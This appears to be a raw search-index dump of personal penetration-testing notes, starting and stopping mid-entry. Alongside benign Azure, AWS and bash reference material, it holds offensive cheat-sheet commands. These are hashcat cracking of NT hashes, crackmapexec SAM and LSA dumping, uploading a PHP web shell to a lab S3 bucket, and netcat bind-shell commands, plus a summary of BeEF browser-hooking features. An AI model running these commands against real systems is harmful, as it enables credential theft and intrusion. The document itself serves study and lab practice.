<pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n(uid:rid:lmhash:nthash)\n</code></pre> <p>Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista &amp; Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS. Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords.</p>"},{"location":"attacking-sam/#3-cracking-hashes-with-hashcat","title":"3. Cracking Hashes with Hashcat","text":"<p>See hashcat:</p> <pre><code># Adding nthashes to a .txt File\n# Copy paste them in hashestocrack.txt\n\n# Hashcat them\nsudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt\n# -m 1000: select module for NT hashes\n</code></pre>"},{"location":"attacking-sam/#dumping-sam-remotely","title":"Dumping SAM Remotely","text":""},{"location":"attacking-sam/#with-crackmapexec","title":"With CrackMapExec","text":"<p>With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. </p> <p>Cheat sheet of CrackMapExec.</p> <pre><code>crackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; --sam\n\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; --lsa\n</code></pre>"},{"location":"aws-cli/","title":"AWS cli","text":"<p>Tool to list S3 objects. S3 is an object storage service in the AWS cloud service. With S3, you can store objects in buckets. Files stored in an Amazon S3 bucket are called S3 objects.</p>","tags":["cloud","amazon","s3","aws"]},{"location":"aws-cli/#installation","title":"Installation","text":"<pre><code>curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\"\nunzip awscliv2.zip\nsudo ./aws/install\n</code></pre> <p>Update version: <pre><code>sudo ./aws/install --bin-dir /usr/local/bin --install-dir /usr/local/aws-cli --update\n</code></pre></p> <p>To access you will need access key. You generate access keys in AWS Dashboard.</p> <pre><code>aws configure  \nAWS Access Key ID [None]: a  \nAWS Secret Access Key [None]: a  \nDefault region name [None]: &lt;region&gt;  \nDefault output format [None]: text\n\n#######################\n###### Where\n#######################\n# - _AWS Access Key ID_ &amp; _AWS Secret Access Key can be any random strings at least one character long,_\n# - _Default region name_ can be any region from [AWS\u2019s region list](https://aws.amazon.com/about-aws/global-infrastructure/regions_az/),\n# - _Default output format_ can be `json`, `yaml`, `yaml-stream`, `table` or `text`. As we are not expecting enormous amount of data, `text` should do just fine.\n</code></pre>","tags":["cloud","amazon","s3","aws"]},{"location":"aws-cli/#basic-commands","title":"Basic commands","text":"<pre><code># Check version\naws --version\n\n# List IAM users (if you have permissions)\naws iam list-users --region &lt;region&gt;\n# --region is optional\n</code></pre> <p>Uploaded the file shell.php to the S3 bucket thetoppers.htb.</p> <pre><code>aws --endpoint=http://s3.thetoppers.htb s3 cp simpleshell.php s3://thetoppers.htb\n</code></pre> <pre><code>aws [service-name] [command] [args] [--flag1] [--flag2]\n</code></pre>","tags":["cloud","amazon","s3","aws"]},{"location":"azure-cli/","title":"Azure-CLI","text":"<p>The Azure CLI is a command-line interface.  A cross-platform command-line program (Windows, Linux and macOs) to connect to Azure and execute administrative commands. </p> <p>All commands: https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest.</p> <p>It\u2019s an executable program that you can use to execute commands in Bash. You can use the Azure CLI to perform every possible management task in Azure. Like Azure PowerShell, the CLI allows you to run one-off commands or you can combine them into a script and execute them together.</p> <p>Azure CLI is a command-line program to connect to Azure and execute administrative commands on Azure resources. It runs on Linux, macOS, and Windows, and allows administrators and developers to execute their commands through a terminal, command-line prompt, or script instead of a web browser.</p>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#installation","title":"Installation","text":"<ul> <li>Linux: apt-get on Ubuntu, yum on Red Hat, and zypper on OpenSUSE</li> <li> <p>Mac: Homebrew.</p> </li> <li> <p>Modify your sources list so that the Microsoft repository is registered and the package manager can locate the Azure CLI package:</p> </li> </ul> <pre><code>AZ_REPO=$(lsb_release -cs)\necho \"deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main\" | \\\nsudo tee /etc/apt/sources.list.d/azure-cli.list\n</code></pre> <ol> <li>Import the encryption key for the Microsoft Ubuntu repository. This allows the package manager to verify that the Azure CLI package you install comes from Microsoft.</li> </ol> <pre><code>curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -\n</code></pre> <ol> <li>Install the Azure CLI:</li> </ol> <pre><code>sudo apt-get install apt-transport-https\nsudo apt-get update\nsudo apt-get install azure-cli\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#basic-usage","title":"Basic usage","text":"<p>Run Azure-CLI</p> <pre><code># Running Azure-CLI from Cloud Shell\nbash\n\n# Running Azure-CLI from Linux\naz\n</code></pre> <p>Basic commands to warm up:</p> <pre><code># See installed version\naz --version\n\n# you can use the letters az to start an Azure command \naz upgrade\n\n# Launch Azure CLI interactive mode\naz interactive\n\n# Getting help. If you want to find commands that might help you manage a storage blob, you can use the find command:\naz find blob\n\n# If you already know the name of the command you want, the\u00a0`--help`\u00a0argument\naz storage blob --help\n</code></pre> <p>Commands in the CLI are structured in\u00a0groups\u00a0and\u00a0subgroups. Each group represents a service provided by Azure, and the subgroups divide commands for these services into logical groupings. For example, the\u00a0<code>storage</code>\u00a0group contains subgroups including\u00a0account,\u00a0blob, and\u00a0queue.</p> <p>Because you're working with a local install of the Azure CLI, you'll need to authenticate before you can execute Azure commands by using the Azure CLI\u00a0login\u00a0command.</p> <pre><code>az login\n</code></pre> <p>The Azure CLI will typically launch your default browser to open the Azure sign-in page. After successfully signing in, you'll be connected to your Azure subscription.</p>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#output-formatting","title":"Output formatting","text":"<pre><code># Results in a json format by default\naz group list\n\n# Results in a line format\naz group list --out tsv\n\n# Results in a table\naz group list --out table\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#resource-groups","title":"Resource groups","text":"<pre><code># List resource groups\naz group list\n# remember you can format output\n\n# List all your resource groups in a table:\naz group list --output table\n\n# Return in json all my resources in my resource group:\naz group list --query \"[?name == '$RESOURCE_GROUP']\"\n\n\n# Retrieve properties from an existing and known resource group\naz group show --name myresourcegroup\n\n# From a specific resource group (provided, for instance, its name), query a value. Querying location:\naz group show --name &lt;name&gt; --query location --out table\n\n# Querying id\naz group show --name &lt;name&gt; --query id --out table\n\n# Create a Resource group\naz group create --name &lt;name&gt; --location &lt;location&gt;\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#disk","title":"Disk","text":"<pre><code># List disks\naz disk list\n\n# Retrieve the properties of an existing Disk\naz disk show --name myDiskname --resource-group rg-test2\n\n# Retrieve the properties of an existing Disk, and output it in a table\naz disk show --name myDiskname --resource-group rg-test2 --out table\n\n\n# Create a new disk\naz disk create --resource-group $myResourceGroup --name $mynewDisk --sku \"Standard_LRD\" --size-gb 32\n\n# Increase the size of a disk\naz disk update --resource-group $myResourceGroup --name $myDiskName --size-gb 64\n\n# Change standard SKU to premium\naz disk update --resource-group $myResourceGroup --name $myDiskName --sku \"Premium_LRS\"\n\n# Verify size of a disk by querying size\naz disk show --resource-group $myResourceGroup --name $myDiskName --query diskSizeGb --out table\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#vms","title":"VMs","text":"<pre><code># Check running VMs\naz vm list\n\n# List IP addresses \naz vm list-ip-addres ses\n\n# Create a VM with UbuntuLTS\naz vm create --resourcegroup MyResourceGroup --name MyVM01 --image UbuntLTS --generate-ssh-keys\n\n# Create a VM\naz vm create --resource-group learn-857e3399-575d-4759-8de9-0c5a22e035e9 --name my-vm  --public-ip-sku Standard --image Ubuntu2204 --admin-username azureuser  --generate-ssh-keys\n\n# Restart existing VM\naz vm restart -g MyResourceGroup -n MyVm\n\n# Configure Nginx on your VM\naz vm extension set  --resource-group learn-857e3399-575d-4759-8de9-0c5a22e035e9  --vm-name my-vm  --name customScript  --publisher Microsoft.Azure.Extensions  --version 2.1  --settings '{\"fileUris\":[\"https://raw.githubusercontent.com/MicrosoftDocs/mslearn-welcome-to-azure/master/configure-nginx.sh\"]}'  --protected-settings '{\"commandToExecute\": \"./configure-nginx.sh\"}'\n\n# Create a variable with public IP address: Run the following\u00a0`az vm list-ip-addresses`\u00a0command to get your VM's IP address and store the result as a Bash variable:\nIPADDRESS=\"$(az vm list-ip-addresses --resource-group learn-51b45310-54be-47c3-8d62-8e53e9839083 --name my-vm --query \"[].virtualMachine.network.publicIpAddresses[*].ipAddress\" --output tsv)\"\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#nsg-network-security-groups","title":"NSG (Network Security Groups)","text":"<pre><code># Run the following\u00a0`az network nsg list`\u00a0command to list the network security groups that are associated with your VM:\naz network nsg list --resource-group learn-51b45310-54be-47c3-8d62-8e53e9839083 --query '[].name' --output tsv\n\n# You see this:\n# my-vmNSG \n# Every VM on Azure is associated with at least one network security group. In this case, Azure created an NSG for you called\u00a0_my-vmNSG_.\n# Run the following\u00a0`az network nsg rule list`\u00a0command to list the rules associated with the NSG named\u00a0_my-vmNSG_:\naz network nsg rule list --resource-group learn-51b45310-54be-47c3-8d62-8e53e9839083 --nsg-name my-vmNSG\n\n# Run the\u00a0`az network nsg rule list`\u00a0command a second time. This time, use the\u00a0`--query`\u00a0argument to retrieve only the name, priority, affected ports, and access (**Allow**\u00a0or\u00a0**Deny**) for each rule. The\u00a0`--output`\u00a0argument formats the output as a table so that it's easy to read.\naz network nsg rule list --resource-group learn-51b45310-54be-47c3-8d62-8e53e9839083 --nsg-name my-vmNSG --query '[].{Name:name, Priority:priority, Port:destinationPortRange, Access:access}' --output table\n# You see this:\n# Name              Priority    Port    Access\n# -----------------  ----------  ------  --------\n# default-allow-ssh  1000        22      Allow\n\n# By default, a Linux VM's NSG allows network access only on port 22. This enables administrators to access the system. You need to also allow inbound connections on port 80, which allows access over HTTP.\n# Run the following\u00a0`az network nsg rule create`\u00a0command to create a rule called\u00a0_allow-http_\u00a0that allows inbound access on port 80:\naz network nsg rule create --resource-group learn-51b45310-54be-47c3-8d62-8e53e9839083 --nsg-name my-vmNSG --name allow-http --protocol tcp --priority 100 --destination-port-range 80 --access Allow\n</code></pre> <p>Script: <pre><code># The script under https://raw.githubusercontent.com/MicrosoftDocs/mslearn-welcome-to-azure/master/configure-nginx.sh\n\n#!/bin/bash\n\n# Update apt cache.\nsudo apt-get update\n\n# Install Nginx.\nsudo apt-get install -y nginx\n\n# Set the home page.\necho \"&lt;html&gt;&lt;body&gt;&lt;h2&gt;Welcome to Azure! My name is $(hostname).&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;\" | sudo tee -a /var/www/html/index.html\n</code></pre></p>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#app-service-plan","title":"App Service plan","text":"<p>Create variables:</p> <pre><code>export RESOURCE_GROUP=learn-fbc52a1a-b4e0-491b-ab1e-a2e3d6eff778 \nexport AZURE_REGION=eastus \nexport AZURE_APP_PLAN=popupappplan-$RANDOM \nexport AZURE_WEB_APP=popupwebapp-$RANDOM\n</code></pre> <p>Create an App Service plan to run your app. </p> <pre><code>az appservice plan create --name $AZURE_APP_PLAN --resource-group $RESOURCE_GROUP --location $AZURE_REGION --sku FREE\n</code></pre> <p>Verify that the service plan was created successfully by listing all your plans in a table:</p> <pre><code>az appservice plan list --output table\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#web-app","title":"Web app","text":"<p>Create variables:</p> <pre><code>export RESOURCE_GROUP=learn-fbc52a1a-b4e0-491b-ab1e-a2e3d6eff778 \nexport AZURE_REGION=eastus \nexport AZURE_APP_PLAN=popupappplan-$RANDOM \nexport AZURE_WEB_APP=popupwebapp-$RANDOM\n</code></pre> <p>Create a Web App</p> <pre><code># Create web app\naz webapp create --name $AZURE_WEB_APP --resource-group $RESOURCE_GROUP --plan $AZURE_APP_PLAN\n</code></pre> <p>List existing ones:</p> <pre><code>az webapp list --output table\n</code></pre> <p>Return HTTP address of my web app:</p> <pre><code>site=\"http://$AZURE_WEB_APP.azurewebsites.net\"\necho $site\n</code></pre> <p>Getting the default html for the sample web app:</p> <pre><code>curl $AZURE_WEB_APP.azurewebsites.net\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#deploy-code-from-github","title":"Deploy code from Github","text":"<p>Create variables:</p> <pre><code>export RESOURCE_GROUP=learn-fbc52a1a-b4e0-491b-ab1e-a2e3d6eff778 \nexport AZURE_REGION=eastus \nexport AZURE_APP_PLAN=popupappplan-$RANDOM \nexport AZURE_WEB_APP=popupwebapp-$RANDOM\n</code></pre> <p>The goal is to deploy code from a GitHub repository to the web app.</p> <pre><code>az webapp deployment source config --name $AZURE_WEB_APP --resource-group $RESOURCE_GROUP --repo-url \"https://github.com/Azure-Samples/php-docs-hello-world\" --branch master --manual-integration\n</code></pre> <p>Once it's deployed, hit your site again with a browser or CURL:</p> <pre><code>curl $AZURE_WEB_APP.azurewebsites.net\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#deploy-an-arm-template","title":"Deploy an ARM template","text":"<p>Prerequisites:</p> <pre><code># First, sign in to Azure by using the Azure CLI \naz login\n\n# define your resource group. \n    # 1. You can obtain available location values from: \naz account list-locations\n    # 2. You can configure the default location using \naz configure --defaults location=&lt;location&gt;\n    # 3. If non existentm create it\n    az group create --name {name of your resource group} --location \"{location}\"\n</code></pre> <p>Now, you are set. Deploy your ARM template:</p> <pre><code>templateFile=\"{provide-the-path-to-the-template-file}\"\naz deployment group create --name blanktemplate --resource-group myResourceGroup --template-file $templateFile\n</code></pre> <p>Use linked templates to deploy complex solutions. You can break a template into many templates and deploy these templates through a main template. When you deploy the main template, it triggers the linked template's deployment. You can store and secure the linked template by using a SAS token.</p>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-cli/#aks","title":"AKS","text":"<p>Azure Container Registry <pre><code># Authenticate to an Azure Container Registry\naz acr login --name &lt;acrName&gt;\n# This will log me to the acr with the token that was generated when authenticating my session firstly.\n</code></pre></p> <pre><code># Get the resource ID of your AKS cluster\nAKS_CLUSTER=$(az aks show --resource-group myResourceGroup --name myAKSCluster --query id -o tsv)\n\n# Get the account credentials for the logged in user\nACCOUNT_UPN=$(az account show --query user.name -o tsv)\nACCOUNT_ID=$(az ad user show --id $ACCOUNT_UPN --query objectId -o tsv)\n\n# Assign the 'Cluster Admin' role to the user\naz role assignment create --assignee $ACCOUNT_ID --scope $AKS_CLUSTER --role \"Azure Kubernetes Service Cluster Admin Role\"\n</code></pre> <pre><code># You create an application named App1 in an Azure tenant. You need to host the application as a multitenant application for any users in Azure, while restricting non-Azure accounts. You need to allow administrators in other Azure tenants to add the application to their gallery.\naz ad app create \u2013display-name app1--sign-in-audience AzureADMultipleOrgs\n</code></pre>","tags":["cloud","azure","bash","azure-cli"]},{"location":"azure-powershell/","title":"Azure Powershell","text":"<p>See all available releases for powershell: https://github.com/PowerShell/PowerShell/releases.</p> <p>Azure powershell documentation: https://learn.microsoft.com/en-us/powershell/azure/?view=azps-10.3.0</p> <p>Az\u00a0is the formal name for the Azure PowerShell module containing cmdlets to work with Azure features. It contains hundreds of cmdlets that let you control nearly every aspect of every Azure resource. You can work with the following features, and more: Resource groups, Storage, VMs, Azure AD, Containers, Machine learning.</p>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#installation","title":"Installation","text":"<pre><code># Get version of the installed AZ module\nGet-InstalledModule -Name Az -AllVersions | Select-Object -Property Name, Version\n\n# To install a new AZ Module, run as Administrator\nInstall-Module -Name Az -AllowClobber -Repository PSGallery -Force\n\n# To update a new AZ Module, run as Administrator\nUpdate-Module -Name Az -AllowClobber -Repository PSGallery\n</code></pre> <p>You can have several versions of Powershell Azure installed.</p>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#linux","title":"Linux","text":"<pre><code># Import the encryption key for the Microsoft Ubuntu repository. This key enables the package manager to verify that the PowerShell package you install comes from Microsoft.\ncurl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -\n\n# Register the Microsoft Ubuntu repository so the package manager can locate the PowerShell package:\nsudo curl -o /etc/apt/sources.list.d/microsoft.list https://packages.microsoft.com/config/ubuntu/18.04/prod.list\n\n# Update the list of packages:\nsudo apt-get update\n\n# Install PowerShell:\nsudo apt-get install -y powershell\n\n# Start PowerShell to verify that it installed successfully:\npwshx\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#basic-commands","title":"Basic commands","text":"<p>Cmdlets are shipped in modules. A PowerShell Module is a dynamic-link library (DLL) that includes the code to process each available cmdlet. Az is the formal name for the Azure PowerShell module, which contains cmdlets to work with Azure features. </p> <pre><code># Load module\nGet-Module\n\n# Install Azure module\nInstall-Module -Name Az -Scope CurrentUser -Repository PSGallery -Force\n\n# Update powershell module\nUpdate-Module -Name Az\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#managing-infrastructure","title":"Managing infrastructure","text":"<p>For an account to work, you need a subscription. Additionally, you will need to create several resources: a resource group, an storage account and a file share.</p> <pre><code># First, connect to your Azure account\nConnect-AzAccount\n\n# List your subscriptions \nGet-AzSubscription\n\n# Set a variable name for your subscription context and set context in Azure\n$context = Get-AzSubscription -SubscriptionId &lt;ID&gt;\n# Set context \nSet-AzContext $context\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#resource-groups","title":"Resource Groups","text":"<pre><code># List existing Resource Groups\nGet-AzResourceGroup\n\n# Create a new Resource group. Two things needed: a name and a location. Create variables for those:\n$location = (Get-AzResourceGroup -Name resource-group_test1).Location\n$rgName = \"myresourcegroup\"\nNew-AzResourceGroup -Name $rgName -Location $location\n\n# A way to assign a variable to location if you want to replicate an existing location from another resource group \n$location = (Get-AzResourceGroup -Name $rgName).Location\n\n\n# Delete resource groups\nRemove-AzResourceGroup -Name \"ContosoRG01\"\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#vms","title":"VMs","text":"<pre><code># List VMs\nGet-AzVm\n\n\n# Create a new VM\nNew-AzVm -ResourceGroupName $rgName -Name \"MyVM01\" -Image \"UbuntLTS\"\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#storage-accounts","title":"Storage accounts","text":"<pre><code># List VMs\nGet-AzStorageAccount\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#file-disk","title":"File Disk","text":"<pre><code># List all File shares\nGet-AzDisk\n\n# Create a new configuration for your File Disk\n$myDiskConfig = New-AzDiskConfig -Location $location -CreateOption Empty -DiskSizeGB 32 -Sku Standard_LRS\n\n# Create the file disk. First assign a variable for the disk name\n$myDiskName = \"myDiskname\"\nNew-AzDisk -ResourceGroupName $myresourcegroup -DiskName $myDiskName -Disk $myDiskConfig\n\n# Increase size of an existing Az Disk\nNew-AzDiskUpdateConfig -DiskSize 64 | Update-AzDisk -ResourceGroup $rgName -DiskName $myDiskName\n\n# Get current SKU of a given Az Disk\n(Get-AzDisk -ResourceGroupName rg-test2 -Name myDiskName).Sku  \n\n# Update an Standard_LRS SKU to a premium one \nNew-AzDiskUpdateConfig -Sku Premium_LRS | Update-AzDisk -ResourceGroupName $rgName -DiskName $myDiskName\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#webapps","title":"WebApps","text":"<pre><code># List webapps and provide name and location\nGet-AzWebapp | Select-Object Name, Location\n</code></pre>","tags":["cloud","azure","powershell"]},{"location":"azure-powershell/#_1","title":"Azure Powershell","text":"","tags":["cloud","azure","powershell"]},{"location":"bash/","title":"Bash  - Bourne Again Shell","text":"","tags":["bash"]},{"location":"bash/#file-descriptors-and-redirections","title":"File descriptors and redirections","text":"<pre><code># &lt;&lt;: # This is known as a \"here document\" or \"here-strings\" operator. It allows you to input multiple lines of text into a command or a file. Example:\ncat &lt;&lt; EOF &gt; stream.txt\n</code></pre> <p>1. <code>cat</code>: It is a command used to display the contents of a file.</p> <p>2. <code>&lt;&lt;</code>: This is known as a \"here document\" or \"here-strings\" operator. It allows you to input multiple lines of text into a command or a file.</p> <p>3. <code>EOF</code>: It stands for \"End of File\" and serves as a delimiter to mark the end of the input. You can choose any other unique string instead of \"EOF\" as long as it is consistent with the opening and closing delimiter.</p> <p>4. <code>&gt;</code>: This is a redirection operator used to redirect the output of a command to a file. In this case, it will create a new file named <code>stream.txt</code> or overwrite its contents if it already exists.</p> <p>5. <code>stream.txt</code>: It is the name of the file where the input text will be written.</p>","tags":["bash"]},{"location":"bash/#shortcuts","title":"Shortcuts","text":"<p>+Delete last word CTRL-W +Fill out the next word that appears in gray: CTRL -&gt;</p>","tags":["bash"]},{"location":"bash/#commands","title":"Commands","text":"","tags":["bash"]},{"location":"bash/#df","title":"df","text":"<p>Displays the amount of space available on the file system containing each file name argument.</p> <pre><code>df -H\n# -H: Print sizes in powers of 1000\n# -h: Print sizes in powers of 1024. Humanly readable.\n</code></pre>","tags":["bash"]},{"location":"bash/#grep","title":"grep","text":"<pre><code>grep -rn /mnt/Finance/ -ie cred\n# `grep`: The command used to search text using patterns.\n#  `-r`: Recursive search, meaning it will search through all files and subdirectories in `/mnt/Finance/`.\n#  `-n`: Displays the line number where the pattern is found within the files.\n#  `/mnt/Finance/`: The directory path where the search is performed.\n#  `-i`: Makes the search case-insensitive, so it will match \"cred\", \"CRED\", \"Cred\", etc.\n#  `-e cred`: Specifies the search pattern `\"cred\"`. It will search for any occurrence of the string \"cred\" in the files.\n</code></pre>","tags":["bash"]},{"location":"bash/#host","title":"host","text":"<p>host is a simple utility for performing DNS lookups. It is normally used to convert names to IP addresses and vice versa. When no arguments or options are given, host prints a short summary of its command-line arguments and options.</p> <pre><code># General syntax\nhost &lt;name&gt; &lt;server&gt; \n\n# &lt;name&gt; is the domain name that is to be looked up. It can also be a dotted-decimal IPv4 address or a colon-delimited IPv6 address, in which case host by default performs  a  reverse  lookup  for  that  address.   \n# &lt;server&gt;  is  an optional argument which is either the name or IP address of the name server that host should query instead of the server or servers listed in /etc/resolv.conf.\n</code></pre> <p>Example:</p> <pre><code>host example.com 8.8.8.8\n</code></pre>","tags":["bash"]},{"location":"bash/#lsblk","title":"lsblk","text":"<pre><code># Lists block devices.\nlsblk\n</code></pre>","tags":["bash"]},{"location":"bash/#lsusb","title":"lsusb","text":"<pre><code># Lists USB devices\nlsusb\n</code></pre>","tags":["bash"]},{"location":"bash/#lsof","title":"lsof","text":"<pre><code># Lists opened files.\nlsof\n</code></pre>","tags":["bash"]},{"location":"bash/#lspci","title":"lspci","text":"<pre><code># Lists PCI devices.\nlspci\n</code></pre>","tags":["bash"]},{"location":"bash/#lsb_release","title":"lsb_release","text":"<p>Print distribution-specific information</p> <pre><code># Display version, id, description, release and codename of the distro\nlsb_release -a \n</code></pre>","tags":["bash"]},{"location":"bash/#mount","title":"mount","text":"<p>We need to install\u00a0<code>cifs-utils</code>\u00a0to connect to an SMB share folder. </p> <p>CIFS (Common Internet File System) is a protocol used for network file sharing. CIFS is an implementation of the SMB (Server Message Block) protocol, commonly used for sharing files and printers between Windows machines and Linux systems.</p> <p>To install it:</p> <pre><code>sudo apt install cifs-utils\n</code></pre> <p>Now mount the file structure:</p> <pre><code>sudo mkdir /mnt/Finance\nsudo mount -t cifs -o username=plaintext,password=Password123,domain=. //$ip/Finance /mnt/Finance\n# \n# `mount -t cifs`: Specifies that you are mounting a CIFS (or SMB) file system.\n</code></pre> <p>As an alternative, we can use a credential file.</p> <pre><code>mount -t cifs //$ip/Finance /mnt/Finance -o credentials=/path/credentialfile\n</code></pre> <p>whereas <code>credentialfile</code>\u00a0has to be structured like this:</p> <pre><code>username=plaintext\npassword=Password123\ndomain=.\n</code></pre> <p>Once a shared folder is mounted, you can use common Linux tools such as\u00a0<code>find</code>\u00a0or\u00a0<code>grep</code>\u00a0to interact with the file structure. </p>","tags":["bash"]},{"location":"bash/#netstat","title":"netstat","text":"<p>Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships. By default, netstat displays a list of open sockets.  If you don't specify any address families, then the active sockets of all configured address families will be printed.</p> <pre><code>netstat -tnlp\n# -p: Show  the  PID  and name of the program to which each socket belongs. \n# -l: Show only listening sockets.\n\n# Show networks accessible via VP\nnetstat -rn\n# -r: Display the kernel routing tables. Replacement for netstat -r is \"ip route\".\n# -n: Show numerical addresses instead of trying to determine symbolic host, port or user names.\n</code></pre>","tags":["bash"]},{"location":"bash/#sed","title":"sed","text":"<p>sed looks for patterns we have defined in the form of regular expressions (regex) and replaces them with another pattern that we have also defined. Let us stick to the last results and say we want to replace the word \"bin\" with \"HTB.\"</p> <p>The \"s\" flag at the beginning stands for the substitute command. Then we specify the pattern we want to replace. After the slash (<code>/</code>), we enter the pattern we want to use as a replacement in the third position. Finally, we use the \"g\" flag, which stands for replacing all matches.</p> <pre><code>cat /etc/passwd | grep -v \"false\\|nologin\" | tr \":\" \" \" | awk '{print $1, $NF}' | sed 's/bin/HTB/g'\n</code></pre>","tags":["bash"]},{"location":"bash/#ss","title":"ss","text":"<p>Sockets statistic. It can be used to check which ports are listening locally on a given machine.</p> <pre><code>ss -ltn\n#-l: Display only listening sockets.\n#-t: Display TCP sockets.\n#-n: Do not try to resolve service name.\n</code></pre> <p>How many services are listening on the target system on all interfaces? (Not on localhost and IPv4 only):</p> <pre><code>ss -l -4 | grep -v \"127\\.0\\.0\" | grep \"LISTEN\" | wc -l\n#   **-l**: show only listening services\n#   **-4**: show only ipv4\n#   **-grep -v \"127.0.0\"**: exclude all localhost results\n#   **-grep \"LISTEN\"**: better filtering only listening services\n#   **wc -l**: count results\n</code></pre>","tags":["bash"]},{"location":"bash/#uname","title":"uname","text":"<pre><code># Print out the kernel release to search for potential kernel exploits quickly.\nuname -r\n\n\n```shell-session\n## Flags\n -a, --all\n              print all information, in the following order, except omit -p and -i if unknown:\n       -s, --kernel-name\n              print the kernel name\n       -n, --nodename\n              print the network node hostname\n       -r, --kernel-release\n              print the kernel release\n       -v, --kernel-version\n              print the kernel version\n       -m, --machine\n              print the machine hardware name\n       -p, --processor\n              print the processor type (non-portable)\n       -i, --hardware-platform\n              print the hardware platform (non-portable)\n       -o, --operating-system\n</code></pre>","tags":["bash"]},{"location":"bash/#xrandr","title":"xrandr","text":"<p>Xrandr is used to set the size, orientation and/or reflection of the outputs for a screen. It can also set the screen size.</p> <pre><code># See commands and usage\nman xrandr\n\n# List current settings\nxrandr\n\n# Also, for listing current settings\nxrandr --current\n</code></pre> <p>Listing current settings helps you out to see the name of the outputs of your screens.</p> <p>In my case:</p> <pre><code># Place laptop to the left of DP-2 (27'')\nxrandr --output eDP-1  --left-of DP-2\n\n# Place 34'' to the right of DP-2 (27'')\nxrandr --output HDMI-1 --right-of DP-2\n\n# Rotate 27''\nxrandr --output DP-2  --rotate left \n</code></pre> <pre><code>xrandr --output  eDP-1 --brightness 0.5\n# ranges from 0 to 1\n</code></pre>","tags":["bash"]},{"location":"beef/","title":"BeEF - The browser exploitation framework project","text":"<p>BeEF\u00a0is short for\u00a0The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.</p>","tags":["web pentesting","phishing","tools"]},{"location":"beef/#installation","title":"Installation","text":"<p>Repository: https://github.com/beefproject/beef</p> <pre><code>git clone https://github.com/beefproject/beef`\n</code></pre>","tags":["web pentesting","phishing","tools"]},{"location":"beef/#usage","title":"Usage","text":"<p>Basically it allows you to create a hook in the persistent or storage script injection. BeEF provides a pannel to see the connections to your hook. If eventually admin connect to the website, you may gain permission to the server.</p>","tags":["web pentesting","phishing","tools"]},{"location":"beef/#basic-commands","title":"Basic commands","text":"<pre><code>Social engineering \nOpen webcams \nAlert messages\nRun javascript\nGet screenshots of what the person has on their screen\nRedirect Browser\nCreate Fake authentication dialog box (facebooks...)\n.......\n</code></pre>","tags":["web pentesting","phishing","tools"]},{"location":"beef/#attacks","title":"Attacks","text":"","tags":["web pentesting","phishing","tools"]},{"location":"beef/#tunneling-proxy","title":"Tunneling proxy","text":"<p>See XSS attacks.</p> <p>An alternative to stealing protected cookies is to use the victim browser as a proxy. The Tunneling Proxy in BeEF exploits the XSS flaw and uses the victim browser to perform requests as the victim user to the web application. Basically, it tunnels requests through the hooked browser. By doing so, there is no way for the web application to distinguish between requests coming from legitimate user and requests forged by an atacker.  BeEF allows you to bypass other web developer protection techniques such as using multiple validations (User-agent, custom headers,...)</p>","tags":["web pentesting","phishing","tools"]},{"location":"beef/#event-logger","title":"Event logger","text":"<p>The event logger allows us to capture keystrokes, acting as a keylogger.</p>","tags":["web pentesting","phishing","tools"]},{"location":"bind-shells/","title":"Bind shells","text":"All about shells Shell Type Description <code>Reverse shell</code> Initiates a connection back to a \"listener\" on our attack box. <code>Bind shell</code> \"Binds\" to a specific port on the target host and waits for a connection from our attack box. <code>Web shell</code> Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a\u00a0<code>PHP</code>\u00a0script to run a single command. <p>In a bind-shell the attacking machine initiates a connection to a listener port on the victim's machine. </p> <p>A basic connection (not a bind shell as there is no interaction with the OS and file system) would be:</p> <pre><code># Listener listening in the victim's machine, the target\nnc -lvnp $port\n\n# Attacker's machine making the connection\nnc -nv $ipVictim $port\n</code></pre>","tags":["pentesting","web pentesting","bind shells"]},{"location":"bind-shells/#bind-shell-connections","title":"Bind shell connections","text":"<p>First step in this attack is always initiating the listening connection on port $port on the victim's machine,  IP $ipVictim.</p>","tags":["pentesting","web pentesting","bind 